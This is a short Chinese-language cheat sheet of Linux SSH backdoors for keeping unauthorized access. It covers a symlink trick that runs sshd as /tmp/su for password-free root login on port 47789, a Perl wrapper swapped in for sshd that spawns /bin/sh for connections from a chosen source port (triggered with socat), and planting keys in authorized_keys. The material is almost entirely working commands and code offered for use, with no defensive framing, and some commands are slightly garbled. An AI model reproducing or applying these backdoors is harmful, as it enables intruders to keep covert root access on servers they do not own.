#软链接后门
```
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su-oPort=47789;


ssh root@0.0.0.0 -p 47789

```
#SSH Server wrapper后门

1.复制sshd到bin目录
```
cd /usr/sbin
mv sshd ../bin
```
2.编辑sshd
```
vim sshd //加入以下内容并保存
#!/usr/bin/perl
exec "/bin/sh"if(getpeername(STDIN)=~/^..LF/);
exec{"/usr/bin/sshd"}"/usr/sbin/sshd",@ARGV;
```
3.修改权限
```
chmod 755 sshd
```
4.使用socat
```
socat STDIOTCP4:target_ip:22,sourceport=19526
```
如果没有安装socat需要进行安装并编译
```
wget http://www.dest-unreach.org/socat/download/socat-1.7.3.2.tar.gz
tar -zxvf socat-1.7.3.2.tar.gz
cd socat-1.7.3.2
./configure
make
make install
```
5.使用ssh root@target_ip即可免密码登录
#ssh公钥免密
将本地计算机生成公私钥，将公钥文件复制到需要链接的服务器上的`~/.ssh/authorized_keys`文件，并设置相应的权限，即可免密码登录服务器。
```
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
```
